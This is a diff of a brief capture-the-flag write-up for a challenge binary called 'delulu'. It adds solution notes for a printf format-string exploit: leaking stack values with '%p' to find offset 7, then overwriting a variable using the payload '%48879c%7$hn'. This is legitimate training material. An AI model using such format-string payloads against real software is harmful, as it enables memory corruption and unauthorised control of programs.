@@ -2,7 +2,7 @@
 
 HALT! Recognition protocol initiated. Please present your face for scanning.
 
-## Solution
+## Attempt
 
 ```sh
 checksec --file=delulu
@@ -60,4 +60,18 @@ b *main+12
 c
 ```
 
-TODO:
+## Solution
+
+https://youtu.be/EGItzKCxTdQ?si=E71gCdTLaIleANMj&t=1595
+
+`%n` printf exploit
+
+enter in `%p.%p.%p.%p.%p.%p.%p.%p.%p` to find offset to local_40
+
+variable ends up being 7 offset
+
+`%0xbeefc`
+
+`%n` is 4 bytes, `%hn` is 2 bytes, `%hhn` is 1 byte
+
+`%48879c%7$hn`
